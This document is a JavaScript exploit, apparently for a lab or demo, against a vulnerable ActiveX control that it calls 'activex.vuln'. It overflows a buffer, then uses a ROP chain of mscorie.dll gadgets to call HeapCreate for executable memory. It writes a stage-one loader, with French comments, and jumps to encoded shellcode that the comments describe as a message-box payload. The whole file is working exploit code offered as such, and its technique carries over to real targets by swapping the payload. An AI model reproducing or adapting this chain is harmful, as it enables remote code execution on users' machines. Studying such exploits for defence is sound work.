/*********************************************************************
 *                           Utilities                               *
 *********************************************************************/

function MakeString(length)
{
    var s = "";
    do {
        s += unescape("%u4141");
    } while (s.length < length);

    return s;
}

//thx ivan+sotirov
function hex (num, width)
{
    var digits = "0123456789ABCDEF";
    var hex = digits.substr(num & 0xF, 1);
    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }
    var width = (width ? width : 0);
    while (hex.length < width)
        hex = "0" + hex;
	return hex;
}

function ptr2str(addr)
{
	return unescape("%u" + hex(addr & 0xFFFF, 4) + "%u" + hex((addr >> 16) & 0xFFFF, 4));
}

function IncEax(length)
{
	var i = 0
	var s = "";
	for(; i < length; i++){
		s += ptr2str(0x63F0219C);
	}
	
	return s;
}

function WriteDword(dword, pop)
{
	var s = "";
	
	if(pop == 1)
		s += ptr2str(0x63F01E13); //pop ecx / retn
	
	s +=  ptr2str(dword)      + //instruction que l'on souhaite écrire
		  ptr2str(0x63F02269) + //on commence à ecrire notre stage1 :: mov [eax+8], ecx / pop ebp / ret 4
		  ptr2str(0xF4F4F4F4) + //dummy :: pop ebp
		  IncEax(1)           + //on deplace eax sur la prochaine zone à ecrire :: inc eax
		  ptr2str(0xF4F4F4F4) + //dummy :: pop ebp
		  IncEax(3);            //inc eax * 3

	return s;
}

////////////////////////////TIME TO PWN/////////////////////////////////////////////////

function Trigger()
{
	//msgbox shellcode
	var sh = unescape("%uc4d9%u65bb%u862a%u31b4%ub1c9%ud94f%u2474%u58f4%uc083%u3104%u1658%u5803%ue216%uf390%u2f6d%u7083%ua456%uab02%u3324%u8255%u372d%u24e4%u3125%uce0a%ua24f%u9699%u51a7%u36e3%u5333%u7823%ue95b%udfa0%uc05a%u01b9%u693c%ue629%ue699%udaf4%uac6a%u5ade%ua76c%ud195%ubc76%uc5f3%u2987%u32e0%u26c1%ub1d2%ud6d0%u392b%ue6e3%u69b7%u2780%u7533%u6848%u78b6%u9c8d%u413c%u476d%uc394%u0c6c%u0fbe%uf86e%udb58%ub57c%u812f%u4860%ubdc4%uc19d%u2a1b%u9114%ub63f%ud946%uce8d%u09a1%u2b78%u7338%u3a12%u7a75%u100e%u1d62%u6a31%uab8d%u9188%ud2c9%u78ca%uac5e%u58f6%u5af3%u5e88%u650c%ue51d%uf2fb%u8a71%u43db%u61e1%u6a2e%ued95%u013b%u9c30%ub94b%u6a9e%ua4c5%u9588%u2c80%ua8bd%u967b%u8e15%u5431%ud3e2%uf6ed%u8a04%u0912%u252b%uaeda%u96f3%u6f4c%ubfa4%u07e2%u2939%ua59e%u89d5%u2524%ua256%u8c91%u1fb8%ua3b2%u0cf1%u0d01%u3bda%u49d9%ub2c9%uf901%uea9a%uda9d%u9834%u747f%u36ab%uc9a0%ua85c%ubfc8%u42cb%u2870%uce58%udde1%u7e36%u6983%u16e6%ue625%u9483%u26d1%u796d%u4f6b%u0d02%ue20e%u848c%uaffd%u3f35%u3ab3%ucba9%u0c7a%u78b9%ua459%u6130%u6a90%u3110%ud882%u656b%u1d15%u79c3%u9503");

	/*
		Stage 1:
		06590008    04 40           ADD AL,40                                         ;eax pointe plus loin dans la zone de sorte à pas réécrire le stage1
		0659000A    54              PUSH ESP                                          ;esp pointe vers notre shellcode, deplacons le dans esi (source dans l'instruction movsd)
		0659000B    5E              POP ESI                                           ;
		
		0659000C    50              PUSH EAX                                          ;maintenant la destination est eax, on la deplace dans edi
		0659000D    5F              POP EDI
		0659000E    31C9            XOR ECX,ECX                                       ;on remet ecx à zéro
		
		06590010    B5 02           MOV CH,2                                          ;on deplace le nombre d'iteration pour le prefixe rep
		06590012    F3:A5           REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI]    ;on recopie notre payload dans notre zone +wx
		
		06590014    FFE0            JMP EAX                                           ;on branche sur notre shellcode :)
		06590016  ^ EB F0           JMP SHORT 06590008                                ;saut pour remonte au debut du stage1, notre ropstack branche ici
	*/
	
	var ropstack  = ptr2str(0x63F04D21)       + //[mscorie.dll]  0x63F04D21 : CALL DWORD PTR DS:[<&KERNEL32.HeapCreate>]
					ptr2str(0xF4F4F4F4)       + //dummy :: ret4 @ CactivexCtrl::vuln()
					ptr2str(0x00040001)       + //flOptions - 
					ptr2str(0x00010001)       + //dwInitialSize
					ptr2str(0x00010001)       + //dwMaximumSize
					ptr2str(0xF4F4F4F4)       + //dummy :: pop ebp @ call dword [<kernel32.heapcreate>]
					ptr2str(0x63F01E13)       + //pop ecx / retn 

					ptr2str(0xF4F4F4F4)       + //dummy :: ret 0x10 @ call dword [<kernel32.heapcreate>]
					ptr2str(0xF4F4F4F4)       + //dummy :: ret 0x10 @ call dword [<kernel32.heapcreate>]
					ptr2str(0xF4F4F4F4)       + //dummy :: ret 0x10 @ call dword [<kernel32.heapcreate>]
					ptr2str(0xF4F4F4F4)       + //dummy :: ret 0x10 @ call dword [<kernel32.heapcreate>]

					// ecriture du stage 1 :: 4dwords
					WriteDword(0x5E544004, 0) + //add al, 40 / push esp / pop esi
					WriteDword(0xC9315F50, 1) + //push eax / pop edi / xor ecx, ecx
					WriteDword(0xA5F302B5, 1) + //mov ch, 2 / rep movsd
					WriteDword(0xF0EBE0FF, 1) + //jmp eax + jmp short

					IncEax(6)                 +
					ptr2str(0x63F0575E)       + //mov [esp], eax / retn
					ptr2str(0xF4F4F4F4);

    var payload = MakeString(258) + ropstack + sh;
	activex.vuln(payload);
}